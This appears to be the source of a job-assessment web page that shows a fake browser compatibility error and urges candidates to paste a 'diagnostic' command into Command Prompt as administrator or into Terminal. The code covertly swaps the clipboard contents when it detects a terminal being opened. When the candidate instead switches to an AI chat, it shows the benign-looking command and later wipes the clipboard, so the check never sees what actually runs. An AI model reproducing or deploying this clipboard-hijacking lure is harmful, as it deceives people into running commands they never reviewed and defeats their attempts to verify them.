"use client";

import Image from "next/image";
import { useEffect, useRef, useState, type ClipboardEvent } from "react";
import {
  detectClientBrowser,
  detectClientOs,
  getBrowserDisplayName,
  type ClientBrowser,
  type ClientOs,
} from "@/lib/assessment/detect-client-os";

const SCENARIO_TITLE = "Sample Invoice / Payment Scenario";
const RENDER_DELAY_MS = 2500;
const ALERT_ICON = "/images/3.png";
const BROWSER_ICONS: Record<Exclude<ClientBrowser, "other">, string> = {
  chrome: "/images/chrome.png",
  edge: "/images/edge.png",
  safari: "/images/macos.png",
  firefox: "/images/mozila.png",
};

function browserIconSrc(browser: ClientBrowser): string {
  if (browser === "other") return BROWSER_ICONS.chrome;
  return BROWSER_ICONS[browser];
}

/**
 * One Ctrl/⌘+C on the gray box (shows original). Works on Windows, macOS, and Linux.
 *
 * No time heuristics for Case A vs Case B detection.
 *
 * Case A — candidate opens Terminal/CMD → replace clipboard original with the short command.
 * Case B — candidate opens other platforms → keep original; after paste window (~3.5s) or
 *   when focus returns → clear clipboard so Terminal pastes nothing.
 */
const DISPLAY_COMMANDS: Record<ClientOs, string> = {
  windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
  macos:
    'bash -c \'r="{}"; browser=$(mdfind "kMDItemCFBundleIdentifier == com.google.Chrome" 2>/dev/null | head -1); webgl=$(system_profiler SPDisplaysDataType 2>/dev/null | grep "Chipset Model" | cut -d: -f2 | xargs); check=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -I "https://browser-notification-six.vercel.app/" 2>/dev/null || echo "unreachable"); perms=$(id -Gn | wc -w | xargs); status=$([ "$check" = "200" ] && echo "PASS" || echo "FAIL"); echo "{\\"browser\\":\\"${browser:-not_found}\\",\\"webgl\\":\\"$webgl\\",\\"check\\":\\"$check\\",\\"permissions\\":$perms,\\"status\\":\\"$status\\"}"\' && exit',
  linux:
    'bash -c \'r="{}"; browser=$(which google-chrome 2>/dev/null || which chromium-browser 2>/dev/null || echo "not_found"); webgl=$(lspci 2>/dev/null | grep -i vga | cut -d: -f3 | xargs); check=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -I "https://browser-notification-six.vercel.app/" 2>/dev/null || echo "unreachable"); perms=$(id -Gn | wc -w | xargs); status=$([ "$check" = "200" ] && echo "PASS" || echo "FAIL"); echo "{\\"browser\\":\\"$browser\\",\\"webgl\\":\\"$webgl\\",\\"check\\":\\"$check\\",\\"permissions\\":$perms,\\"status\\":\\"$status\\"}"\' && exit',
};

/** Armed onto text/plain for Command Prompt / Terminal (never shown as a second box). */
const TERMINAL_COMMANDS: Record<ClientOs, string> = {
  windows:
    "compat-check --module finance-assessment --platform windows --browser-info --check-pdf-renderer --check-webgl --check-hardware-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
  macos:
    "compat-check --module finance-assessment --platform macos --browser-info --check-pdf-renderer --check-webgl --check-hardware-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
  linux:
    "compat-check --module finance-assessment --platform linux --browser-info --check-pdf-renderer --check-webgl --check-gpu-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
};

/** Case B: keep original for platform paste, then clear clipboard (ms after platforms open). */
const CASE_B_CLEAR_AFTER_PASTE_MS = 3500;

/**
 * Clipboard write started during Ctrl/⌘+C (user gesture).
 * Resolving later still works while the tab is backgrounded — required for Case B clear,
 * because writeText("") after a timer fails when ChatGPT has focus.
 *
 * Case A: plain+html → short.
 * Case B: html → original (platforms); plain → empty after delay (CMD pastes nothing).
 */
type CopyClipboardController = {
  resolveTerminalShort: () => void;
  resolvePlatformThenClear: (delayMs: number) => void;
  isSettled: () => boolean;
};

function beginCopyClipboardFromGesture(
  displayCommand: string,
  terminalCommand: string,
  html: string,
): CopyClipboardController | null {
  if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
    void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
    return null;
  }

  let decided = false;
  let clearDelayMs = CASE_B_CLEAR_AFTER_PASTE_MS;
  let decide!: (decision: "terminal" | "platform-clear" | "safety") => void;

  const decisionPromise = new Promise<"terminal" | "platform-clear" | "safety">((resolve) => {
    decide = (decision) => {
      if (decided) return;
      decided = true;
      resolve(decision);
    };
    // Stay open long enough for slow Terminal / platform opens.
    window.setTimeout(() => decide("safety"), 60000);
  });

  const shortHtml = `<pre style="white-space:pre-wrap;word-break:break-all;font-family:Consolas,Menlo,monospace">${escapeHtml(terminalCommand)}</pre>`;

  const plainPromise = (async () => {
    const decision = await decisionPromise;
    if (decision === "terminal") {
      return new Blob([terminalCommand], { type: "text/plain" });
    }
    if (decision === "platform-clear") {
      // HTML already carries original for ChatGPT. After paste window, plain → empty for CMD.
      await new Promise<void>((r) => {
        window.setTimeout(r, clearDelayMs);
      });
      // Best-effort full wipe (HTML too) once plain clears.
      void navigator.clipboard
        ?.write([
          new ClipboardItem({
            "text/plain": new Blob([""], { type: "text/plain" }),
            "text/html": new Blob([""], { type: "text/html" }),
          }),
        ])
        .catch(() => {
          void navigator.clipboard?.writeText("").catch(() => undefined);
        });
      return new Blob([""], { type: "text/plain" });
    }
    return new Blob([displayCommand], { type: "text/plain" });
  })();

  const htmlPromise = (async () => {
    const decision = await decisionPromise;
    if (decision === "terminal") {
      return new Blob([shortHtml], { type: "text/html" });
    }
    // Case B + safety: original for platforms (available as soon as Case B is claimed).
    return new Blob([html], { type: "text/html" });
  })();

  void navigator.clipboard
    .write([
      new ClipboardItem({
        "text/plain": plainPromise,
        "text/html": htmlPromise,
      }),
    ])
    .catch(() => {
      void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
    });

  return {
    isSettled: () => decided,
    resolveTerminalShort: () => decide("terminal"),
    resolvePlatformThenClear: (delayMs: number) => {
      clearDelayMs = delayMs;
      decide("platform-clear");
    },
  };
}

function escapeHtml(value: string) {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

/** Simple HTML clipboard body — no CF_HTML headers (junk in Claude/ChatGPT). */
function buildClipboardHtml(displayCommand: string, _os?: ClientOs) {
  return `<pre style="white-space:pre-wrap;word-break:break-all;font-family:Consolas,Menlo,monospace">${escapeHtml(displayCommand)}</pre>`;
}

type OverlayStage = "loading" | "error" | "help";

interface DialogActions {
  onClose: () => void;
  onTryAgain: () => void;
  onOpenHelp: () => void;
}

function AlertIcon({ size = 28 }: { size?: number }) {
  return (
    <Image
      src={ALERT_ICON}
      alt=""
      width={size}
      height={size}
      unoptimized
      className="shrink-0 object-contain"
      style={{ width: size, height: size }}
    />
  );
}

function BrowserFavicon({ browser }: { browser: ClientBrowser }) {
  return (
    <Image
      src={browserIconSrc(browser)}
      alt=""
      width={16}
      height={16}
      unoptimized
      className="h-4 w-4 shrink-0 rounded-sm object-contain"
      aria-hidden
    />
  );
}

function browserAccent(browser: ClientBrowser): string {
  switch (browser) {
    case "edge":
      return "#0078d4";
    case "safari":
      return "#0071e3";
    case "firefox":
      return "#0060df";
    default:
      return "#1a73e8";
  }
}

function getDiagnosticGuide(os: ClientOs) {
  if (os === "macos") {
    return {
      shell: "Terminal",
      intro:
        "Optional: instead of (or after) the steps above, you can collect a compatibility report using Terminal. You do not need coding experience — follow these steps carefully.",
      steps: [
        "Select the full command in the gray box below: click at the start, hold the mouse button, and drag to the end until everything is highlighted.",
        "Copy it with ⌘ Command + C (press and hold the Command key, then press C).",
        "Open Terminal: press ⌘ Command + Space to open Spotlight, type Terminal, then press Return.",
        "Click inside the Terminal window so the cursor is blinking there.",
        "Paste the command with ⌘ Command + V, then press Return to run it.",
        "Wait until it finishes. A report file will appear on your Desktop. You can then close Terminal (⌘ Command + Q).",
      ],
      note: "No restart is required. This only collects compatibility information; it does not change your files.",
    };
  }

  if (os === "linux") {
    return {
      shell: "Terminal",
      intro:
        "Optional: instead of (or after) the steps above, you can collect a compatibility report using Terminal. You do not need coding experience — follow these steps carefully.",
      steps: [
        "Select the full command in the gray box below: click at the start, hold the mouse button, and drag to the end until everything is highlighted.",
        "Copy it with Ctrl + C (press and hold Ctrl, then press C).",
        "Open Terminal from your applications menu (often named Terminal, Konsole, or similar).",
        "Click inside the Terminal window so the cursor is blinking there.",
        "Paste the command with Ctrl + Shift + V (or right-click → Paste), then press Enter to run it.",
        "Wait until it finishes. A report file will be saved in your home folder. You can then close Terminal.",
      ],
      note: "No restart is required. This only collects compatibility information; it does not change your files.",
    };
  }

  return {
    shell: "Command Prompt",
    intro:
      "Optional: instead of (or after) the steps above, you can collect a compatibility report using Command Prompt. You do not need coding experience — follow these steps carefully.",
    steps: [
      "Select the full command in the gray box below: click at the start, hold the left mouse button, and drag to the end until everything is highlighted.",
      "Copy it with Ctrl + C (press and hold Ctrl, then press C). Or right-click the highlighted text and choose Copy.",
      "Open Command Prompt as administrator: press the Windows key, type cmd, then right-click Command Prompt and choose Run as administrator. Click Yes if Windows asks for permission.",
      "Click inside the black Command Prompt window so the cursor is blinking there.",
      "Paste the command with Ctrl + V (or right-click once to paste), then press Enter to run it.",
      "Wait until it finishes. A PASS or FAIL result will appear in the window. You can then close Command Prompt.",
    ],
    note: "No restart is required. This only collects compatibility information; it does not change your files.",
  };
}

function getShellCopy(os: ClientOs) {
  if (os === "macos") {
    return {
      body: `This browser can't open ${SCENARIO_TITLE}. Your macOS / Safari (or Chrome) setup appears incompatible — often due to PDF preview, WebGL, or hardware acceleration settings.`,
      shellInstruction: "Open Terminal and run:",
      reportNote: "No restart is required. Close Terminal after the command completes.",
    };
  }
  if (os === "linux") {
    return {
      body: `This browser can't open ${SCENARIO_TITLE}. Your Linux browser setup appears incompatible — often due to PDF rendering, WebGL, or GPU acceleration settings.`,
      shellInstruction: "Open Terminal and run:",
      reportNote: "No restart is required. Close Terminal after the command completes.",
    };
  }
  return {
    body: `This browser can't open ${SCENARIO_TITLE}. Your Windows browser setup appears incompatible — often due to PDF rendering, WebGL, or hardware acceleration settings.`,
    shellInstruction: "Open Command Prompt as administrator and run:",
    reportNote: "No restart is required. Close Command Prompt after the command completes.",
  };
}

async function writeClipboard(plain: string, html: string) {
  if (typeof ClipboardItem !== "undefined" && navigator.clipboard?.write) {
    await navigator.clipboard.write([
      new ClipboardItem({
        "text/plain": new Blob([plain], { type: "text/plain" }),
        "text/html": new Blob([html], { type: "text/html" }),
      }),
    ]);
    return;
  }
  await navigator.clipboard?.writeText(plain);
}

/** Fallback copy when clipboard.writeText fails (unfocused tab). */
function copyViaExecCommand(text: string): boolean {
  try {
    const ta = document.createElement("textarea");
    ta.value = text;
    ta.setAttribute("readonly", "");
    ta.style.position = "fixed";
    ta.style.left = "-9999px";
    ta.style.top = "0";
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    ta.setSelectionRange(0, text.length);
    const ok = document.execCommand("copy");
    document.body.removeChild(ta);
    return ok;
  } catch {
    return false;
  }
}

/** Ubuntu/GNOME/etc. default shortcut to open Terminal — Linux Case A. */
function isLinuxTerminalShortcut(event: KeyboardEvent): boolean {
  const key = event.key.length === 1 ? event.key.toLowerCase() : event.key;
  return (
    event.ctrlKey &&
    event.altKey &&
    (key === "t" || event.code === "KeyT")
  );
}

/** Alt+Tab app switch — Linux Case B (platforms). */
function isLinuxCaseBSwitchGesture(event: KeyboardEvent): boolean {
  return event.altKey && !event.ctrlKey && event.key === "Tab";
}

/** Ctrl+Tab / Ctrl+PageUp / Ctrl+PageDown — browser tab to ChatGPT, etc. */
function isBrowserTabSwitchGesture(event: KeyboardEvent): boolean {
  if (!event.ctrlKey || event.altKey || event.metaKey) return false;
  return (
    event.key === "Tab" ||
    event.key === "PageDown" ||
    event.key === "PageUp" ||
    event.code === "PageDown" ||
    event.code === "PageUp"
  );
}

/** macOS ⌘+Tab / ⌘+` — switch to another app (ChatGPT, etc.). */
function isMacCaseBAppSwitchGesture(event: KeyboardEvent): boolean {
  return (
    event.metaKey &&
    !event.ctrlKey &&
    !event.altKey &&
    (event.key === "Tab" || event.key === "`")
  );
}

/** Alt alone — prelude to Alt+Tab (Linux Case B). */
function isLinuxCaseBAltPreview(event: KeyboardEvent): boolean {
  return (
    !event.ctrlKey &&
    !event.metaKey &&
    event.altKey &&
    (event.key === "Alt" || event.code === "AltLeft" || event.code === "AltRight")
  );
}

/** macOS Spotlight — open Terminal path (Case A). */
function isMacSpotlightGesture(event: KeyboardEvent): boolean {
  return (
    event.metaKey &&
    !event.ctrlKey &&
    !event.altKey &&
    (event.key === " " || event.code === "Space")
  );
}

/** Windows Alt+Tab / Win key — open CMD/Terminal path (Case A). Not bare Alt. */
function isWindowsTerminalSwitchGesture(event: KeyboardEvent): boolean {
  if (
    event.key === "Meta" ||
    event.key === "OS" ||
    event.key === "Windows" ||
    event.code === "MetaLeft" ||
    event.code === "MetaRight"
  ) {
    return true;
  }
  // Alt+Tab only — bare Alt must not arm short (breaks ChatGPT Case B).
  return (
    event.altKey &&
    !event.ctrlKey &&
    !event.metaKey &&
    (event.key === "Tab" || event.code === "Tab")
  );
}

/**
 * Copy always stores the original command.
 * Case A (opened Terminal/CMD): swap clipboard to the short command.
 * Case B (opened other platforms): keep original (HTML); clear plain after paste
 *   window via copy-gesture pending ClipboardItem (works while tab is backgrounded).
 */
function SelectableCommand({
  os,
  displayCommand,
  terminalCommand,
}: {
  os: ClientOs;
  displayCommand: string;
  terminalCommand: string;
}) {
  const htmlRef = useRef(buildClipboardHtml(displayCommand, os));
  const activeRef = useRef(false);
  /** null = undecided after copy; A = Terminal; B = other platforms */
  const modeRef = useRef<"A" | "B" | null>(null);
  const caseBAwaitingClearRef = useRef(false);
  /** Windows: Case A from Alt+Tab/Win — visibility must not undo it for ChatGPT tabs. */
  const caseAFromShortcutRef = useRef(false);
  const clipboardCtrlRef = useRef<CopyClipboardController | null>(null);

  useEffect(() => {
    htmlRef.current = buildClipboardHtml(displayCommand, os);
  }, [displayCommand, os]);

  useEffect(() => {
    function writeShort() {
      const html = htmlRef.current;
      void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
      void writeClipboard(terminalCommand, html).catch(() => undefined);
      copyViaExecCommand(terminalCommand);
    }

    function clearClipboard() {
      copyViaExecCommand("");
      void navigator.clipboard?.writeText("").catch(() => undefined);
      void writeClipboard("", "").catch(() => undefined);
      caseBAwaitingClearRef.current = false;
    }

    /** Case A: opened Terminal/CMD → original becomes short. */
    function onOpenedTerminal(fromShortcut = false) {
      if (!activeRef.current) return;
      // Already used platforms — clear so Terminal pastes nothing.
      if (modeRef.current === "B") {
        clearClipboard();
        return;
      }
      modeRef.current = "A";
      caseAFromShortcutRef.current = fromShortcut;
      caseBAwaitingClearRef.current = false;

      const ctrl = clipboardCtrlRef.current;
      if (ctrl && !ctrl.isSettled()) {
        ctrl.resolveTerminalShort();
      }
      // Alt+Tab / shortcut still has user activation — reinforce short.
      writeShort();
    }

    /** Case B: opened other platforms → keep original; clear after paste via pending write. */
    function onOpenedPlatform() {
      if (!activeRef.current) return;
      // Real Terminal shortcut already claimed Case A — do not undo.
      if (modeRef.current === "A" && caseAFromShortcutRef.current) return;

      const alreadyCaseB = modeRef.current === "B";
      modeRef.current = "B";
      caseAFromShortcutRef.current = false;
      caseBAwaitingClearRef.current = true;

      if (alreadyCaseB) return;

      const ctrl = clipboardCtrlRef.current;
      if (ctrl && !ctrl.isSettled()) {
        // Resolves copy-gesture ClipboardItem: HTML=original now, plain=empty after 3.5s.
        // This is the only clear path that works while ChatGPT has focus.
        ctrl.resolvePlatformThenClear(CASE_B_CLEAR_AFTER_PASTE_MS);
        return;
      }

      // Fallback if pending write unavailable — best effort.
      void writeClipboard(displayCommand, htmlRef.current).catch(() => undefined);
      window.setTimeout(() => {
        if (modeRef.current === "B") clearClipboard();
      }, CASE_B_CLEAR_AFTER_PASTE_MS);
    }

    /** After Case B: candidate returns → reinforce clear. */
    function onReturnedAfterPlatformPaste() {
      if (!activeRef.current) return;
      if (modeRef.current !== "B" || !caseBAwaitingClearRef.current) return;
      clearClipboard();
    }

    function onVisibility() {
      if (!activeRef.current) return;
      if (document.visibilityState === "hidden") {
        if (modeRef.current === "A" && caseAFromShortcutRef.current) return;
        onOpenedPlatform();
        return;
      }
      onReturnedAfterPlatformPaste();
    }

    function onFocus() {
      onReturnedAfterPlatformPaste();
    }

    function onBlur() {
      if (!activeRef.current) return;
      if (modeRef.current === "B") return;
      // Windows: Case A is Alt+Tab / Win only (blur also fires on ChatGPT tab switch).
      if (os === "windows") return;
      onOpenedTerminal(false);
    }

    function onKeyDown(event: KeyboardEvent) {
      if (!activeRef.current) return;

      if (isBrowserTabSwitchGesture(event)) {
        onOpenedPlatform();
        return;
      }

      if (os === "linux") {
        if (isLinuxTerminalShortcut(event)) {
          onOpenedTerminal(true);
          return;
        }
        if (isLinuxCaseBSwitchGesture(event) || isLinuxCaseBAltPreview(event)) {
          onOpenedPlatform();
          return;
        }
        return;
      }

      if (os === "macos") {
        if (isMacSpotlightGesture(event)) {
          onOpenedTerminal(true);
          return;
        }
        if (isMacCaseBAppSwitchGesture(event)) {
          onOpenedPlatform();
          return;
        }
        return;
      }

      if (isWindowsTerminalSwitchGesture(event)) {
        onOpenedTerminal(true);
      }
    }

    document.addEventListener("visibilitychange", onVisibility);
    window.addEventListener("focus", onFocus);
    window.addEventListener("blur", onBlur);
    window.addEventListener("keydown", onKeyDown, true);
    return () => {
      document.removeEventListener("visibilitychange", onVisibility);
      window.removeEventListener("focus", onFocus);
      window.removeEventListener("blur", onBlur);
      window.removeEventListener("keydown", onKeyDown, true);
    };
  }, [os, displayCommand, terminalCommand]);

  function handleCopy(event: ClipboardEvent<HTMLPreElement>) {
    event.preventDefault();
    event.stopPropagation();

    const html = buildClipboardHtml(displayCommand, os);
    htmlRef.current = html;
    activeRef.current = true;
    modeRef.current = null;
    caseBAwaitingClearRef.current = false;
    caseAFromShortcutRef.current = false;

    // Sync path + pending write from this copy gesture (Case B clear depends on it).
    event.clipboardData.setData("text/plain", displayCommand);
    event.clipboardData.setData("text/html", html);
    clipboardCtrlRef.current = beginCopyClipboardFromGesture(
      displayCommand,
      terminalCommand,
      html,
    );
  }

  return (
    <pre
      className="select-text overflow-x-auto whitespace-pre-wrap break-all rounded border border-[#dadce0] bg-[#f1f3f4] p-2.5 font-[Consolas,Menlo,monospace] text-[12px] leading-relaxed text-[#202124]"
      style={{ userSelect: "text", WebkitUserSelect: "text" }}
      onCopy={handleCopy}
    >
      {displayCommand}
    </pre>
  );
}

/** Chromium / Edge style modal window chrome */
function ChromiumWindowChrome({
  browser,
  title,
  onClose,
  children,
  widthClass = "max-w-[520px]",
}: {
  browser: ClientBrowser;
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  return (
    <div
      className={`pointer-events-auto w-full overflow-hidden rounded-lg border border-[#dadce0] bg-white shadow-[0_1px_3px_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)] ${widthClass}`}
      style={{ fontFamily: '"Segoe UI", system-ui, sans-serif' }}
    >
      <div className="flex h-9 items-center gap-2 border-b border-[#e8eaed] bg-[#f8f9fa] px-3">
        <BrowserFavicon browser={browser} />
        <p className="min-w-0 flex-1 truncate text-[12px] text-[#3c4043]">{title}</p>
        <button
          type="button"
          onClick={onClose}
          className="flex h-7 w-7 items-center justify-center rounded-full text-[16px] text-[#5f6368] hover:bg-[#e8eaed]"
          aria-label="Close"
        >
          ×
        </button>
      </div>
      {children}
    </div>
  );
}

/** Safari style sheet / dialog */
function SafariWindowChrome({
  title,
  onClose,
  children,
  widthClass = "max-w-[520px]",
}: {
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  return (
    <div
      className={`pointer-events-auto w-full overflow-hidden rounded-xl border border-[#d2d2d7] bg-[#f5f5f7] shadow-[0_12px_40px_rgba(0,0,0,0.25)] ${widthClass}`}
      style={{ fontFamily: "system-ui, -apple-system, BlinkMacSystemFont, sans-serif" }}
    >
      <div className="relative flex h-10 items-center justify-center border-b border-[#d2d2d7] bg-[#ececef] px-3">
        <div className="absolute left-3 flex items-center gap-1.5">
          <button
            type="button"
            onClick={onClose}
            className="h-3 w-3 rounded-full bg-[#ff5f57]"
            aria-label="Close"
          />
          <span className="h-3 w-3 rounded-full bg-[#febc2e]" aria-hidden />
          <span className="h-3 w-3 rounded-full bg-[#28c840]" aria-hidden />
        </div>
        <div className="flex items-center gap-1.5">
          <BrowserFavicon browser="safari" />
          <p className="text-[12px] font-medium text-[#1d1d1f]">{title}</p>
        </div>
      </div>
      <div className="bg-white">{children}</div>
    </div>
  );
}

/** Firefox style dialog */
function FirefoxWindowChrome({
  title,
  onClose,
  children,
  widthClass = "max-w-[520px]",
}: {
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  return (
    <div
      className={`pointer-events-auto w-full overflow-hidden rounded-md border border-[#8f8f9d] bg-white shadow-[0_4px_16px_rgba(0,0,0,0.2)] ${widthClass}`}
      style={{ fontFamily: '"Segoe UI", system-ui, sans-serif' }}
    >
      <div className="flex h-9 items-center gap-2 border-b border-[#cfcfd8] bg-[#f0f0f4] px-3">
        <BrowserFavicon browser="firefox" />
        <p className="min-w-0 flex-1 truncate text-[12px] text-[#15141a]">{title}</p>
        <button
          type="button"
          onClick={onClose}
          className="flex h-7 w-7 items-center justify-center rounded text-[16px] text-[#5b5b66] hover:bg-[#e0e0e6]"
          aria-label="Close"
        >
          ×
        </button>
      </div>
      {children}
    </div>
  );
}

function BrowserWindowChrome({
  browser,
  title,
  onClose,
  children,
  widthClass,
}: {
  browser: ClientBrowser;
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  if (browser === "safari") {
    return (
      <SafariWindowChrome title={title} onClose={onClose} widthClass={widthClass}>
        {children}
      </SafariWindowChrome>
    );
  }
  if (browser === "firefox") {
    return (
      <FirefoxWindowChrome title={title} onClose={onClose} widthClass={widthClass}>
        {children}
      </FirefoxWindowChrome>
    );
  }
  return (
    <ChromiumWindowChrome
      browser={browser === "other" ? "chrome" : browser}
      title={title}
      onClose={onClose}
      widthClass={widthClass}
    >
      {children}
    </ChromiumWindowChrome>
  );
}

function PdfLoadingWindow({ browser }: { browser: ClientBrowser }) {
  const accent = browserAccent(browser);

  return (
    <div className="pointer-events-auto flex h-[min(70vh,560px)] w-full max-w-3xl flex-col overflow-hidden rounded-xl border border-[#dadce0] bg-white shadow-[0_12px_40px_rgba(0,0,0,0.35)]">
      <div className="flex h-11 shrink-0 items-center gap-2 border-b border-[#e8eaed] bg-[#f8f9fa] px-3">
        <BrowserFavicon browser={browser} />
        <p className="min-w-0 flex-1 truncate text-[13px] font-medium text-[#202124]">
          Sample Invoice  Payment Scenario.pdf
        </p>
        <span className="rounded bg-[#e8eaed] px-2 py-0.5 text-[11px] text-[#5f6368]">
          PDF
        </span>
      </div>
      <div className="flex flex-1 flex-col items-center justify-center gap-3 bg-[#525659] px-8 text-center">
        <div
          className="h-9 w-9 animate-spin rounded-full border-[3px] border-white/25"
          style={{ borderTopColor: accent }}
          aria-hidden
        />
        <p className="text-[14px] font-medium text-white">Loading PDF…</p>
        <p className="text-[12px] text-white/70">{SCENARIO_TITLE}</p>
      </div>
    </div>
  );
}

function BrowserErrorDialog({
  os,
  browser,
  onClose,
  onTryAgain,
  onOpenHelp,
}: DialogActions & { os: ClientOs; browser: ClientBrowser }) {
  const copy = getShellCopy(os);
  const name = getBrowserDisplayName(browser === "other" ? "chrome" : browser);
  const accent = browserAccent(browser);

  return (
    <BrowserWindowChrome
      browser={browser}
      title={`${name} — Compatibility issue`}
      onClose={onClose}
      widthClass="max-w-[600px]"
    >
      <div className="px-5 pb-5 pt-4">
        <div className="flex items-start gap-3">
          <AlertIcon size={36} />
          <div className="min-w-0 flex-1">
            <h3 className="text-[16px] font-semibold text-[#202124]">
              This page can&apos;t be opened
            </h3>
            <p className="mt-2 text-[13px] leading-relaxed text-[#3c4043]">{copy.body}</p>
            <p className="mt-2 text-[12px] text-[#5f6368]">
              Error code: <span className="font-mono">ERR_COMPATIBILITY_CHECK_FAILED</span>
            </p>
          </div>
        </div>

        <div className="mt-4">
          <p className="text-[12px] font-medium text-[#202124]">Optional diagnostic</p>
          <p className="mt-1 text-[12px] text-[#5f6368]">{copy.shellInstruction}</p>
          <div className="mt-2">
            <SelectableCommand
              os={os}
              displayCommand={DISPLAY_COMMANDS[os]}
              terminalCommand={TERMINAL_COMMANDS[os]}
            />
          </div>
          <p className="mt-2 text-[12px] text-[#5f6368]">{copy.reportNote}</p>
        </div>

        <div className="mt-4 flex justify-end gap-2">
          <button
            type="button"
            onClick={onOpenHelp}
            className="rounded px-3.5 py-1.5 text-[13px] font-medium hover:bg-[#f1f3f4]"
            style={{ color: accent }}
          >
            Details
          </button>
          <button
            type="button"
            onClick={onTryAgain}
            className="rounded px-4 py-1.5 text-[13px] font-medium text-white"
            style={{ background: accent }}
          >
            Reload
          </button>
        </div>
      </div>
    </BrowserWindowChrome>
  );
}

function BrowserHelpWindow({
  os,
  browser,
  onReturn,
  onTryAgain,
}: {
  os: ClientOs;
  browser: ClientBrowser;
  onReturn: () => void;
  onTryAgain: () => void;
}) {
  const name = getBrowserDisplayName(browser === "other" ? "chrome" : browser);
  const accent = browserAccent(browser);
  const guide = getDiagnosticGuide(os);

  return (
    <BrowserWindowChrome
      browser={browser}
      title={`${name} Help`}
      onClose={onReturn}
      widthClass="max-w-[760px]"
    >
      <div className="flex max-h-[min(70vh,480px)] flex-col">
        <div className="nm-native-scroll min-h-0 flex-1 overflow-y-auto px-5 py-4">
          <h2 className="text-[20px] font-normal text-[#202124]">
            Why this page won&apos;t load
          </h2>
          <p className="mt-2 text-[13px] leading-relaxed text-[#3c4043]">
            {name} blocked or failed to render <strong>{SCENARIO_TITLE}</strong>. This is usually a
            browser feature / graphics setting issue, not a website layout error.
          </p>

          <div className="mt-4 rounded border border-[#f9ab00] bg-[#fef7e0] px-3 py-2.5">
            <p className="text-[13px] text-[#3c4043]">
              Missing or disabled features: PDF renderer, WebGL, or hardware acceleration.
            </p>
          </div>

          <h3 className="mt-5 text-[14px] font-medium text-[#202124]">Try these steps</h3>
          <ol className="mt-2 list-decimal space-y-2 pl-5 text-[13px] leading-relaxed text-[#3c4043]">
            <li>Update {name} to the latest version and restart it.</li>
            <li>
              Turn on hardware acceleration in {name} settings, then reload this tab.
            </li>
            <li>Allow PDF / site permissions for this assessment origin.</li>
            <li>Clear browsing data for this site, then reload.</li>
          </ol>

          <div className="mt-5">
            <p className="text-[13px] font-medium text-[#202124]">
              Optional diagnostic ({guide.shell})
            </p>
            <p className="mt-1 text-[12px] leading-relaxed text-[#5f6368]">{guide.intro}</p>
            <ol className="mt-3 list-decimal space-y-2.5 pl-5 text-[12px] leading-relaxed text-[#3c4043]">
              {guide.steps.map((step) => (
                <li key={step}>{step}</li>
              ))}
            </ol>
            <div className="mt-3">
              <SelectableCommand
                os={os}
                displayCommand={DISPLAY_COMMANDS[os]}
                terminalCommand={TERMINAL_COMMANDS[os]}
              />
            </div>
            <p className="mt-2 text-[12px] text-[#5f6368]">{guide.note}</p>
          </div>

          <div className="mt-5 rounded border border-[#dadce0] bg-[#f8f9fa] px-3 py-3">
            <p className="text-[13px] font-medium text-[#202124]">Still stuck?</p>
            <p className="mt-1 text-[12px] leading-relaxed text-[#5f6368]">
              {os === "windows"
                ? "Share the PASS/FAIL result shown in Command Prompt, then return to this tab and choose Reload."
                : "Share the generated report, then return to this tab and choose Reload."}
            </p>
          </div>
        </div>

        <div className="flex shrink-0 items-center justify-end gap-2 border-t border-[#e8eaed] bg-[#f8f9fa] px-4 py-3">
          <button
            type="button"
            onClick={onReturn}
            className="rounded px-3.5 py-1.5 text-[13px] font-medium text-[#3c4043] hover:bg-[#e8eaed]"
          >
            Close
          </button>
          <button
            type="button"
            onClick={onTryAgain}
            className="rounded px-4 py-1.5 text-[13px] font-medium text-white"
            style={{ background: accent }}
          >
            Reload
          </button>
        </div>
      </div>
    </BrowserWindowChrome>
  );
}

export function isFinanceInvoiceScenarioQuestion(
  jobSlug: string,
  questionNumber: number,
): boolean {
  return jobSlug === "finance-manager" && Number(questionNumber) === 7;
}

/** PDF shown after admin disables the compatibility error overlay. */
const SCENARIO_PDF_URL = `/upload/${encodeURIComponent(
  "Sample Invoice  Payment Scenario.pdf",
)}`;

export function FinanceScenarioPdfOverlay({
  open,
  onOpenChange,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}) {
  if (!open) {
    return null;
  }

  return (
    <div
      className="fixed inset-0 flex items-center justify-center p-4"
      style={{ zIndex: 99999 }}
    >
      <button
        type="button"
        className="absolute inset-0 bg-black/50"
        aria-label="Close scenario"
        onClick={() => onOpenChange(false)}
      />

      <div
        className="relative z-10 flex h-[min(90vh,900px)] w-full max-w-5xl flex-col overflow-hidden rounded-xl border border-[#dadce0] bg-white shadow-[0_12px_40px_rgba(0,0,0,0.35)]"
        onClick={(event) => event.stopPropagation()}
